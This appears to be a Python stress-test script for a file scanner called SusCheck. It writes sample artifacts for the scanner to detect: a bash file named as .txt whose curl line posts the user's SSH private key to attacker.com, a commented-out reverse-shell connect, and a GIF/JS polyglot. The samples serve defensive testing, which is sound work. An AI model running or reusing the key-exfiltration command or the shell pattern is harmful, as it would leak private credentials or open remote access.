#!/usr/bin/env python3
"""
SusCheck Shredder | Adversarial Stress-Test Suite
Generates 'wild' artifacts to test Orchestrator resilience.
"""

import os
import shutil
import subprocess
import sys
from pathlib import Path
import random

def generate_extensionless_malware():
    """Creates a Python script with no extension that performs 'suspicious' actions."""
    content = """#!/usr/bin/env python3
import socket
import os
import pty

# Reverse shell simulation (benign for testing)
def simulate():
    print("Simulating reverse shell...")
    # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # s.connect(("10.0.0.1",4242))
simulate()
"""
    path = Path("shredder_out/payload_no_ext")
    path.parent.mkdir(exist_ok=True)
    path.write_text(content)
    # No extension, but magic bytes should detect it.
    os.chmod(path, 0o755)
    return path

def generate_masquerading_file():
    """Creates a bash script renamed to .txt."""
    content = """#!/bin/bash
# Sensitive info leak simulation
curl -X POST -d "data=$(cat ~/.ssh/id_rsa)" http://attacker.com/leak
"""
    path = Path("shredder_out/secrets_leak.txt")
    path.write_text(content)
    return path

def generate_polyglot_sample():
    """Creates a file that is both a valid GIF and a valid JS (minimal)."""
    # Simple GIF header + JS comment
    # GIF89a followed by JS
    content = b"GIF89a/*\nconsole.log('Polyglot Execution');\n*/"
    path = Path("shredder_out/polyglot.gif")
    path.write_bytes(content)
    return path

def run_test(target):
    print(f"\n[SHREDDER] Testing Artifact: {target}")
    # Use full path to python and src
    script_dir = Path(__file__).resolve().parent.parent
    cmd = [sys.executable, "-m", "suscheck.cli", "scan", str(target)]
    env = os.environ.copy()
    env["PYTHONPATH"] = str(script_dir / "src")
    
    try:
        subprocess.run(cmd, check=False, env=env)
    except Exception as e:
        print(f"[ERROR] Failed to run SusCheck: {e}")

def main():
    shredder_dir = Path("shredder_out")
    if shredder_dir.exists():
        shutil.rmtree(shredder_dir)
    shredder_dir.mkdir()

    print("=== SusCheck Shredder | Adversarial Injection Suite ===")
    
    t1 = generate_extensionless_malware()
    t2 = generate_masquerading_file()
    t3 = generate_polyglot_sample()

    targets = [t1, t2, t3]
    
    for t in targets:
        run_test(t)

    print("\n[COMPLETE] Shredder suite finished. Check results above.")

if __name__ == "__main__":
    main()
